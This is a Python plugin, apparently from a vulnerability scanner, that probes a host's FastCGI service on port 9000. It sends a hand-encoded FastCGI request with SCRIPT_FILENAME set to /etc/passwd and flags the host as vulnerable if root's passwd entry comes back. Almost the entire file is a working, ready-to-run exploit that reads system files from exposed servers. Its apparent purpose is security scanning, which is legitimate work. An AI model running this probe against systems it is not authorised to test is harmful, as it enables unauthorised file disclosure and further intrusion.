#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from lib.poc.dummy import *


async def test_fastcgi(ip):
    data = """
    01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00
    01 04 00 01 00 8f 01 00  0e 03 52 45 51 55 45 53
    54 5f 4d 45 54 48 4f 44  47 45 54 0f 08 53 45 52
    56 45 52 5f 50 52 4f 54  4f 43 4f 4c 48 54 54 50
    2f 31 2e 31 0d 01 44 4f  43 55 4d 45 4e 54 5f 52
    4f 4f 54 2f 0b 09 52 45  4d 4f 54 45 5f 41 44 44
    52 31 32 37 2e 30 2e 30  2e 31 0f 0b 53 43 52 49
    50 54 5f 46 49 4c 45 4e  41 4d 45 2f 65 74 63 2f
    70 61 73 73 77 64 0f 10  53 45 52 56 45 52 5f 53
    4f 46 54 57 41 52 45 67  6f 20 2f 20 66 63 67 69
    63 6c 69 65 6e 74 20 00  01 04 00 01 00 00 00 00
    """
    data_s = ''
    for _ in data.split():
        data_s += chr(int(_, 16))

    reader, writer = await asyncio.open_connection(ip, 9000)
    writer.write(data_s.encode())
    await writer.drain()
    data = await asyncio.wait_for(reader.read(200), 6)
    writer.close()
    try:
        await writer.wait_closed()  # application data after close notify (_ssl.c:2730)
    except Exception as e:
        pass

    try:
        if data.find(b':root:') > 0:
            return True, data
    except Exception as e:
        pass

    return False, None


async def do_scan(ip, port, service, is_http, task_msg):
    if port != 9000:
        return
    try:
        ret, txt = await test_fastcgi(ip)
        if ret:
            vul = {
                'alert_group': 'FastCGI Remote Code Execution',
                'affects': '%s:%s' % (ip, port),
                'details': u'fastcgi的低版本存在命令执行漏洞，可查看任意文件或者执行命令导致被入侵\n'
                           u'%s:9000 fastcgi remote code execution. \n Found text: \n%s' %
                           (ip, re.search('root:.*', txt).group(0))
            }
            return vul
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 9000, 'cslistener', False, task_msg={})
    run_plugin_test(scan)
